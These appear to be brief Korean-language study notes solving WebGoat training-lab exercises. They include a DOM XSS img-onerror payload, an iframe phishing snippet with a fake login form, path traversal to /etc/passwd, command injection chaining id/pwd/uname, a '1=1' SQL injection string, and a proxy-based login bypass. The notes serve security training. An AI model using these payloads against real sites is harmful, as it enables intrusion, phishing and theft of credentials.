# WebGoat

{% stepper %}
{% step %}
### Using an Access Control Matrix
{% endstep %}

{% step %}
### Bypass a Path Based Access Control Scheme
{% endstep %}

{% step %}
### LAB: DOM-Based cross-site scripting

*
* \<img src=/WebGoat/images/logos/owasp.jpg>
* 스크립트 내용을 받아오는 방법&#x20;
* Payload:

```html
<img src=x onerror='document.body.innerHTML="<img src=/WebGoat/images/logos/owasp.jpg>"'>
```
{% endstep %}

{% step %}
### Multi Level Login 2

* 2차 인증 이상의 인증이 있는 것을 의미
* 2차 인증을 완료하면 신용카드 정보를 확인할 수 있다.
* Tan 코드를 입력해 로그인을 시도할 때 Proxy를 통해 hidden user을 목표로 하는 Jane으로 바꿔서 요청하면 성공
{% endstep %}

{% step %}
### Discover Clues in the HTML

* 웹 소스코드를 확인하면 발견할 수 있음
*
{% endstep %}

{% step %}
### Phishing with XSS

*
* Example iframe phishing:

```html
<iframe frameborder=0 width=400 height=200 src="내가 만든 피싱 주소"></iframe>
<iframe frameborder=0 width=400 height=200 src=http://192.168.56.102/>
```

Example HTML form found:

{% code title="login.html" %}
```html
User Authentication
<p>
<form id=id action=/ method=GET>
	Username<br>
	<input type=text name=id><br>
	Password<br>
	<input type=password name=pw><br>
	<input type=submit value=Login onclick="document.getElementById('id').submit()">
</form>
```
{% endcode %}
{% endstep %}

{% step %}
### Command Injection

* HelpFile 대신에 `../../../../../../../../../etc/passwd`를 추가
*
* `CSRF.help&id&pwd&uname` 형식으로 바꿔도 명령어를 다중으로 실행하여 원하는 결과를 만들 수도 있다.(이때 URL encoding 필요)
* 예: `CSRF.help%22%26id%26pwd%26uname%22`&#x20;
{% endstep %}

{% step %}
### Numeric SQL Injection

* 프록시로 잡아서 sql injection 시도
* 예시 페이로드: `102%20or%201=1`&#x20;
* 이때 특수문자(띄어쓰기)는 %20(아스키코드)으로 encoding
{% endstep %}

{% step %}
### String SQL Injection
{% endstep %}

{% step %}
### References

* https://github.com/WebGoat/WebGoat/wiki/Main-Exploits
{% endstep %}
{% endstepper %}
